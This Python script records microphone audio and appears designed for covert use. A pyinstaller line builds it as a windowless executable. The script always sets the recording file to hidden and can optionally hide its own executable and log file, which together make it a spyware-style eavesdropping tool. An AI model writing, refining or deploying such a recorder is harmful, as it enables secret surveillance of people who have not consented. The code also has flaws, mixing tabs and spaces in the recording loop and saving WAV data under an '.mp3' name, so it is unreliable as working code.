"""
pyinstaller --onefile --hidden-import=pyaudio --hidden-import=wave --hidden-import=sys --hidden-import=win32api --hidden-import=argparse --hidden-import=logging --hidden-import=win32con --hidden-import=os -w record.py
"""

import pyaudio,wave,sys,logging,argparse,win32api,win32con,os,datetime

parser = argparse.ArgumentParser(description='A simple python recorder')
parser.add_argument("seconds", help="Seconds of recording",type=int)
parser.add_argument("-v", "--verbose", help="Log file",action="store_true")
parser.add_argument("-i", "--hidden", help="Hidden script",action="store_true")
args = parser.parse_args()

if args.verbose:
	LOG_FILENAME = "record.log"
	logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG)
	try:
		win32api.SetFileAttributes(LOG_FILENAME,win32con.FILE_ATTRIBUTE_HIDDEN)
	except Exception as e:
		logging.exception("HIDE EXCEPTION")
	logging.debug("Setting log file hidden ... Done !")

if args.hidden:
    try:
    	win32api.SetFileAttributes("record.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
    	logging.exception("HIDE EXCEPTION")
    logging.debug("Setting script file hidden ... Done !")

now = datetime.datetime.now()
hour = str(now.hour)
minute = str(now.minute)
second = str(now.second)
FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = args.seconds
WAVE_OUTPUT_FILENAME = "record_"+hour+"_"+minute+"_"+second+".mp3"
frames = []
logging.debug("Seconds: %d", RECORD_SECONDS)
logging.debug("Output file: "+ WAVE_OUTPUT_FILENAME)

try:
	audio = pyaudio.PyAudio()
	stream = audio.open(format=FORMAT, channels=CHANNELS,rate=RATE, input=True,frames_per_buffer=CHUNK)
	logging.debug("Recording ...")
	for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
		data = stream.read(CHUNK)
    	frames.append(data)
	logging.debug("Done !")
	stream.stop_stream()
	stream.close()
	audio.terminate()
except Exception as e:
	logging.exception("STREAM EXCEPTION")

try:
	waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	waveFile.setnchannels(CHANNELS)
	waveFile.setsampwidth(audio.get_sample_size(FORMAT))
	waveFile.setframerate(RATE)
	waveFile.writeframes(b''.join(frames))
	waveFile.close()
	win32api.SetFileAttributes(WAVE_OUTPUT_FILENAME,win32con.FILE_ATTRIBUTE_HIDDEN)
	logging.debug("Setting output file hidden ... Done !")
except Exception as e:
	logging.exception("FILE EXCEPTION")

logging.debug("Close script ... Done !")